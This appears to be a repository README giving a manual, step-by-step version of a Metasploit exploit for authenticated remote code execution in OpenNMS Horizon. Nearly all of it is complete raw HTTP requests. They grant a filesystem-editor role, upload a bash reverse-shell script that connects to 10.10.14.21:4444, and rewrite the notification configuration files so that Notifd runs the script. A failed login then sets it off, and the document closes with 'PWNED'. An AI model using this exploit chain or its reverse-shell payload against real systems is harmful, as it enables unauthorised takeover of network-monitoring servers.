# OpenNMS-Horizon-Authenticated-RCE
Manual version of the MSF module https://www.rapid7.com/db/modules/exploit/linux/http/opennms_horizon_authenticated_rce/
Just another way of doing the same thing that the MSF module does, step by step. All credit goes to original researchers.

## Tips
Leave request bodies as is, changing only the `Cookie:` and `Host:` headers as needed.
## Step 1: Obtain Admin Cookie
Open Burp Suite, use browser to login as admin/admin
In Proxy tab, find `GET` request with `JESSIONID` cookie set. Copy that value and use below.
## Step 2: Turn on notifications
### Request Body
```
POST /opennms/admin/updateNotificationStatus HTTP/1.1
Host: localhost
Content-Length: 10
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost/opennms/admin/index.jsp
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=node0lc00w9anevfa6y4cqrc8bsl394.node0; JSESSIONID=node0162i1s8f0vaasqm1db9pwayt693.node0
Connection: keep-alive

status=on

```
### Expected Response
`HTTP/1.1 302 Found`
## Step 3: Test Filesystem endpoint access
In browser, navigate to http://localhost/opennms/rest/filesystem/contents?f=users.xml, should return `403 Unauthorized`, if request comes back `200 OK`, skip to step 5.
## Step 4: Modify admin role via users API
### Request Body
```
PUT /opennms/rest/users/admin/roles/ROLE_FILESYSTEM_EDITOR HTTP/1.1
Host: localhost
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=node0lc00w9anevfa6y4cqrc8bsl394.node0; JSESSIONID=node0162i1s8f0vaasqm1db9pwayt693.node0
Connection: keep-alive
```
### Expected Response
`HTTP/1.1 204 No Content`
## Step 5: Test Filesystem endpoint again
In browser, navigate to http://localhost/opennms/rest/filesystem/contents?f=users.xml
Should have downloaded a contents file. Look for the following under admin user.
```xml
<role>ROLE_ADMIN</role>
<role>ROLE_FILESYSTEM_EDITOR</role>
```
## Step 6: Place evil.sh reverse shell
### Request Body
```
POST /opennms/rest/filesystem/contents?f=evil.bsh HTTP/1.1
Host: localhost
Content-Length: 189
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://localhost
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost/opennms/login.jsp
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----boundary123
Cookie: JSESSIONID=node0lc00w9anevfa6y4cqrc8bsl394.node0; JSESSIONID=node0162i1s8f0vaasqm1db9pwayt693.node0
Connection: keep-alive

------boundary123
Content-Disposition: form-data; name="upload"; filename="evil.bsh"
Content-Type: text/plain

bash -i >/dev/tcp/10.10.14.21/4444 0<&1 2>&1 & sleep 10

------boundary123--
```
### Expected Response
`HTTP/1.1 200 OK`
`Successfully wrote to '/opt/opennms/etc/evil.bsh'.`
## Step 7: Modify Notification Commands XML
### Request Body
```
POST /opennms/rest/filesystem/contents?f=notificationCommands.xml HTTP/1.1
Host: localhost
Content-Length: 189
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://localhost
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost/opennms/login.jsp
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----boundary123
Cookie: JSESSIONID=node0lc00w9anevfa6y4cqrc8bsl394.node0; JSESSIONID=node0162i1s8f0vaasqm1db9pwayt693.node0
Connection: keep-alive

------boundary123
Content-Disposition: form-data; name="upload"; filename="notificationCommands.xml"
Content-Type: text/xml

<notification-commands xmlns="http://xmlns.opennms.org/xsd/notificationCommands">
   <header>
      <ver>.9</ver>
      <created>Wednesday, February 6, 2002 10:10:00 AM EST</created>
      <mstation>master.nmanage.com</mstation>
   </header>
   <command binary="false">
      <name>javaPagerEmail</name>
      <execute>org.opennms.netmgt.notifd.JavaMailNotificationStrategy</execute>
      <comment>class for sending pager email notifications</comment>
      <contact-type>pagerEmail</contact-type>
      <argument streamed="false">
         <switch>-subject</switch>
      </argument>
      <argument streamed="false">
         <switch>-pemail</switch>
      </argument>
      <argument streamed="false">
         <switch>-tm</switch>
      </argument>
   </command>
   <command binary="false">
      <name>javaEmail</name>
      <execute>org.opennms.netmgt.notifd.JavaMailNotificationStrategy</execute>
      <comment>class for sending email notifications</comment>
      <contact-type>email</contact-type>
      <argument streamed="false">
         <switch>-subject</switch>
      </argument>
      <argument streamed="false">
         <switch>-email</switch>
      </argument>
      <argument streamed="false">
         <switch>-tm</switch>
      </argument>
   </command>
   <command binary="true">
      <name>textPage</name>
      <execute>/usr/bin/qpage</execute>
      <comment>text paging program</comment>
      <contact-type>textPage</contact-type>
      <argument streamed="false">
         <switch>-p</switch>
      </argument>
      <argument streamed="false">
         <switch>-t</switch>
      </argument>
   </command>
   <command binary="true">
      <name>numericPage</name>
      <execute>/usr/bin/qpage</execute>
      <comment>numeric paging program</comment>
      <contact-type>numericPage</contact-type>
      <argument streamed="false">
         <substitution>-p</substitution>
         <switch>-d</switch>
      </argument>
      <argument streamed="false">
         <switch>-nm</switch>
      </argument>
   </command>
   <command binary="false">
      <name>xmppMessage</name>
      <execute>org.opennms.netmgt.notifd.XMPPNotificationStrategy</execute>
      <comment>class for sending XMPP notifications</comment>
      <contact-type>xmppAddress</contact-type>
      <argument streamed="false">
         <switch>-xmpp</switch>
      </argument>
      <argument streamed="false">
         <switch>-tm</switch>
      </argument>
   </command>
   <command binary="false">
      <name>xmppGroupMessage</name>
      <execute>org.opennms.netmgt.notifd.XMPPGroupNotificationStrategy</execute>
      <comment>class for sending XMPP Group Chat notifications</comment>
      <contact-type>xmppAddress</contact-type>
      <argument streamed="false">
         <switch>-xmpp</switch>
      </argument>
      <argument streamed="false">
         <switch>-tm</switch>
      </argument>
   </command>
   <command binary="false">
      <name>ircCat</name>
      <execute>org.opennms.netmgt.notifd.IrcCatNotificationStrategy</execute>
      <comment>class for sending IRC notifications via an IRCcat bot</comment>
      <contact-type>email</contact-type>
      <argument streamed="false">
         <switch>-email</switch>
      </argument>
      <argument streamed="false">
         <switch>-tm</switch>
      </argument>
   </command>
   <command binary="false">
      <name>callWorkPhone</name>
      <execute>org.opennms.netmgt.notifd.asterisk.AsteriskOriginateNotificationStrategy</execute>
      <comment>class for calling via Asterisk for notifications</comment>
      <contact-type>workPhone</contact-type>
      <argument streamed="false">
         <switch>-d</switch>
      </argument>
      <argument streamed="false">
         <switch>-nodeid</switch>
      </argument>
      <argument streamed="false">
         <switch>-interface</switch>
      </argument>
      <argument streamed="false">
         <switch>-service</switch>
      </argument>
      <argument streamed="false">
         <switch>-subject</switch>
      </argument>
      <argument streamed="false">
         <switch>-wphone</switch>
      </argument>
      <argument streamed="false">
         <switch>-tm</switch>
      </argument>
      <argument streamed="false">
         <switch>-tuipin</switch>
      </argument>
   </command>
   <command binary="false">
      <name>callMobilePhone</name>
      <execute>org.opennms.netmgt.notifd.asterisk.AsteriskOriginateNotificationStrategy</execute>
      <comment>class for calling via Asterisk for notifications</comment>
      <contact-type>mobilePhone</contact-type>
      <argument streamed="false">
         <switch>-d</switch>
      </argument>
      <argument streamed="false">
         <switch>-nodeid</switch>
      </argument>
      <argument streamed="false">
         <switch>-interface</switch>
      </argument>
      <argument streamed="false">
         <switch>-service</switch>
      </argument>
      <argument streamed="false">
         <switch>-subject</switch>
      </argument>
      <argument streamed="false">
         <switch>-mphone</switch>
      </argument>
      <argument streamed="false">
         <switch>-tm</switch>
      </argument>
      <argument streamed="false">
         <switch>-tuipin</switch>
      </argument>
   </command>
   <command binary="false">
      <name>callHomePhone</name>
      <execute>org.opennms.netmgt.notifd.asterisk.AsteriskOriginateNotificationStrategy</execute>
      <comment>class for calling via Asterisk for notifications</comment>
      <contact-type>homePhone</contact-type>
      <argument streamed="false">
         <switch>-d</switch>
      </argument>
      <argument streamed="false">
         <switch>-nodeid</switch>
      </argument>
      <argument streamed="false">
         <switch>-interface</switch>
      </argument>
      <argument streamed="false">
         <switch>-service</switch>
      </argument>
      <argument streamed="false">
         <switch>-subject</switch>
      </argument>
      <argument streamed="false">
         <switch>-mphone</switch>
      </argument>
      <argument streamed="false">
         <switch>-tm</switch>
      </argument>
      <argument streamed="false">
         <switch>-tuipin</switch>
      </argument>
   </command>
   <command binary="false">
      <name>microblogUpdate</name>
      <execute>org.opennms.netmgt.notifd.MicroblogNotificationStrategy</execute>
      <comment>class for updating a microblog service (Identica / StatusNet / Twitter) for notifications</comment>
      <argument streamed="false">
         <switch>-tm</switch>
      </argument>
   </command>
   <command binary="false">
      <name>microblogReply</name>
      <execute>org.opennms.netmgt.notifd.MicroblogReplyNotificationStrategy</execute>
      <comment>class for replying to a microblog (Identica / StatusNet / Twitter) user for notifications</comment>
      <contact-type>microblog</contact-type>
      <argument streamed="false">
         <switch>-ublog</switch>
      </argument>
      <argument streamed="false">
         <switch>-tm</switch>
      </argument>
   </command>
   <command binary="false">
      <name>microblogDM</name>
      <execute>org.opennms.netmgt.notifd.MicroblogDMNotificationStrategy</execute>
      <comment>class for sending direct messages to a microblog (Identica / StatusNet / Twitter) user for notifications</comment>
      <contact-type>microblog</contact-type>
      <argument streamed="false">
         <switch>-ublog</switch>
      </argument>
      <argument streamed="false">
         <switch>-tm</switch>
      </argument>
   </command>
   <command binary="false">
      <name>browser</name>
      <execute>org.opennms.netmgt.notifd.BrowserNotificationStrategy</execute>
      <comment>Sending Notification to the Browser</comment>
      <argument streamed="false">
         <switch>-d</switch>
      </argument>
      <argument streamed="false">
         <switch>-subject</switch>
      </argument>
       <argument streamed="false">
           <switch>-tm</switch>
       </argument>
   </command>
   <command binary="true">
    <name>evil_command</name>
    <execute>/usr/bin/bash</execute>
    <comment>test evil command</comment>
    <argument streamed="false">
        <substitution>/usr/share/opennms/etc/evil.bsh</substitution>
    </argument>
   </command>
</notification-commands>


------boundary123--
```
### Expected Response
`HTTP/1.1 200 OK`
`Successfully wrote to '/opt/opennms/etc/notificationCommands.xml'.`
## Step 8: Modify Destination Paths XML
### Request Body
```
POST /opennms/rest/filesystem/contents?f=destinationPaths.xml HTTP/1.1
Host: localhost
Content-Length: 189
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://localhost
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost/opennms/login.jsp
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----boundary123
Cookie: JSESSIONID=node0lc00w9anevfa6y4cqrc8bsl394.node0; JSESSIONID=node0162i1s8f0vaasqm1db9pwayt693.node0
Connection: keep-alive

------boundary123
Content-Disposition: form-data; name="upload"; filename="destinationPaths.xml"
Content-Type: text/xml

<destinationPaths xmlns="http://xmlns.opennms.org/xsd/destinationPaths">
   <header>
      <rev>1.2</rev>
      <created>Wednesday, February 6, 2002 10:10:00 AM EST</created>
      <mstation>localhost</mstation>
   </header>
   <path name="Email-Admin">
      <target>
         <name>Admin</name>
         <command>javaEmail</command>
      </target>
   </path>
   <path name="evil_path">
    <target>
        <name>Admin</name>
        <command>evil_command</command>
    </target>
   </path>
</destinationPaths>


------boundary123--
```
### Expected Response
`HTTP/1.1 200 OK`
`Successfully wrote to '/opt/opennms/etc/destinationPaths.xml'.`
## Step 9: Modify Notifications XML
### Request Body
```
POST /opennms/rest/filesystem/contents?f=notifications.xml HTTP/1.1
Host: localhost
Content-Length: 189
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://localhost
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost/opennms/login.jsp
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----boundary123
Cookie: JSESSIONID=node0lc00w9anevfa6y4cqrc8bsl394.node0; JSESSIONID=node0162i1s8f0vaasqm1db9pwayt693.node0
Connection: keep-alive

------boundary123
Content-Disposition: form-data; name="upload"; filename="notifications.xml"
Content-Type: text/xml

<notifications xmlns="http://xmlns.opennms.org/xsd/notifications">
   <header>
      <rev>1.2</rev>
      <created>Wednesday, February 6, 2002 10:10:00 AM EST</created>
      <mstation>localhost</mstation>
   </header>
   <notification name="interfaceDown" status="on">
      <uei>uei.opennms.org/nodes/interfaceDown</uei>
      <rule>IPADDR != '0.0.0.0'</rule>
      <destinationPath>Email-Admin</destinationPath>
      <text-message>All services are down on interface %interfaceresolve% (%interface%) 
on node %nodelabel%.  New Outage records have been created 
and service level availability calculations will be impacted 
until this outage is resolved.  
	</text-message>
      <subject>Notice #%noticeid%: %interfaceresolve% (%interface%) on node %nodelabel% down.</subject>
      <numeric-message>111-%noticeid%</numeric-message>
   </notification>
   <notification name="nodeDown" status="on">
      <uei>uei.opennms.org/nodes/nodeDown</uei>
      <rule>IPADDR != '0.0.0.0'</rule>
      <destinationPath>Email-Admin</destinationPath>
      <text-message>All services are down on node %nodelabel%.  New Outage records have 
been created and service level availability calculations will 
be impacted until this outage is resolved.  
	</text-message>
      <subject>Notice #%noticeid%: node %nodelabel% down.</subject>
      <numeric-message>111-%noticeid%</numeric-message>
   </notification>
   <notification name="nodeLostService" status="on">
      <uei>uei.opennms.org/nodes/nodeLostService</uei>
      <rule>IPADDR != '0.0.0.0'</rule>
      <destinationPath>Email-Admin</destinationPath>
      <text-message>The %service% service poll on interface %interfaceresolve% (%interface%) 
on node %nodelabel% failed at %time%. 
	</text-message>
      <subject>Notice #%noticeid%: %service% down on %interfaceresolve% (%interface%) on node %nodelabel%.</subject>
      <numeric-message>111-%noticeid%</numeric-message>
   </notification>
   <notification name="nodeAdded" status="on">
      <uei>uei.opennms.org/nodes/nodeAdded</uei>
      <rule>IPADDR != '0.0.0.0'</rule>
      <destinationPath>Email-Admin</destinationPath>
      <text-message>OpenNMS has discovered a new node named
%parm[nodelabel]%. Please be advised.</text-message>
      <subject>Notice #%noticeid%: %parm[nodelabel]% discovered.</subject>
      <numeric-message>111-%noticeid%</numeric-message>
   </notification>
   <notification name="interfaceDeleted" status="on">
      <uei>uei.opennms.org/nodes/interfaceDeleted</uei>
      <rule>IPADDR != '0.0.0.0'</rule>
      <destinationPath>Email-Admin</destinationPath>
      <text-message>Due to extended downtime or operator action, the interface %interfaceresolve% (%interface%) 
on node %nodelabel% has been deleted from OpenNMS's polling database.</text-message>
      <subject>Notice #%noticeid%: [OpenNMS] %interfaceresolve% (%interface%) on node %nodelabel% deleted.</subject>
      <numeric-message>111-%noticeid%</numeric-message>
   </notification>
   <notification name="High Threshold" status="off">
      <uei>uei.opennms.org/threshold/highThresholdExceeded</uei>
      <description>A monitored device has hit a high threshold</description>
      <rule>IPADDR != '0.0.0.0'</rule>
      <destinationPath>Email-Admin</destinationPath>
      <text-message>A Threshold has been exceeded on node: %nodelabel%, interface:%interface%. The parameter %parm[ds]% reached a value of %parm[value]% while the threshold is %parm[threshold]%. This alert will be rearmed when %parm[ds]% reaches %parm[rearm]%.</text-message>
      <subject>Notice #%noticeid%: High Threshold for %parm[ds]% on node %nodelabel%.</subject>
   </notification>
   <notification name="Low Threshold" status="off">
      <uei>uei.opennms.org/threshold/lowThresholdExceeded</uei>
      <description>A monitored device has hit a low threshold</description>
      <rule>IPADDR != '0.0.0.0'</rule>
      <destinationPath>Email-Admin</destinationPath>
      <text-message>A Threshold has been exceeded on node: %nodelabel%, interface:%interface%. The parameter %parm[ds]% reached a value of %parm[value]% while the threshold is %parm[threshold]%. This alert will be rearmed when %parm[ds]% reaches %parm[rearm]%.</text-message>
      <subject>Notice #%noticeid%: Low Threshold for %parm[ds]% on node %nodelabel%.</subject>
   </notification>
   <notification name="Low Threshold Rearmed" status="off">
      <uei>uei.opennms.org/threshold/lowThresholdRearmed</uei>
      <description>A monitored device has recovered from a low threshold</description>
      <rule>IPADDR != '0.0.0.0'</rule>
      <destinationPath>Email-Admin</destinationPath>
      <text-message>A Threshold has returned to normal on node: %nodelabel%, interface:%interface%. The parameter %parm[ds]% reached a value of %parm[value]% with a rearm threshold of %parm[rearm]%. This threshold for this alert was %parm[threshold]%.</text-message>
      <subject>Notice #%noticeid%: Low Threshold Rearmed for %parm[ds]% on node %nodelabel%.</subject>
   </notification>
   <notification name="High Threshold Rearmed" status="off">
      <uei>uei.opennms.org/threshold/highThresholdRearmed</uei>
      <description>A monitored device has recovered from a high threshold</description>
      <rule>IPADDR != '0.0.0.0'</rule>
      <destinationPath>Email-Admin</destinationPath>
      <text-message>A Threshold has returned to normal on node: %nodelabel%, interface:%interface%. The parameter %parm[ds]% reached a value of %parm[value]% with a rearm threshold of %parm[rearm]%. This threshold for this alert was %parm[threshold]%.</text-message>
      <subject>Notice #%noticeid%: High Threshold Rearmed for %parm[ds]% on node %nodelabel%.</subject>
   </notification>
   <notification name="evil_notification" status="on">
    <uei>uei.opennms.org/internal/authentication/failure</uei>
    <rule>IPADDR != '192.0.2.123'</rule>
    <destinationPath>evil_path</destinationPath>
    <text-message>Trigger Evil Notification</text-message>
   </notification>
</notifications>


------boundary123--
```
### Expected Response
`HTTP/1.1 200 OK`
`Successfully wrote to '/opt/opennms/etc/notifications.xml'.`
## Step 10: Reload configuration via XML POST
### Request Body
```
POST /opennms/rest/events HTTP/1.1
Host: localhost
Content-Length: 189
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://localhost
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost/opennms/login.jsp
Accept-Encoding: gzip, deflate, br
Content-Type: application/xml
Cookie: JSESSIONID=node0lc00w9anevfa6y4cqrc8bsl394.node0; JSESSIONID=node0162i1s8f0vaasqm1db9pwayt693.node0
Connection: keep-alive

<event xmlns="http://xmlns.opennms.org/xsd/event">
  <uei>uei.opennms.org/internal/reloadDaemonConfig</uei>
  <source>burp_send_event</source>
  <time>2025-06-06T12:00:00-00:00</time>
  <host>burphost</host>
  <parms>
    <parm>
      <parmName>daemonName</parmName>
      <value type="string" encoding="text">Notifd</value>
    </parm>
  </parms>
</event>

```
### Expected Response
`HTTP/1.1 202 Accepted`
## Step 11: Trigger Evil Notification Via Bad Logon (START LISTENER FIRST)
Can also be done via browser, just use bad creds.
### Request Body
```
POST /opennms/j_spring_security_check HTTP/1.1
Host: localhost
Content-Length: 54
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost/opennms/login.jsp
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

j_username=badusernope&j_password=notapassword


```
### Expected Response
`HTTP/1.1 302 Found`
## Step 12: Check your Shell!
`PWNED`
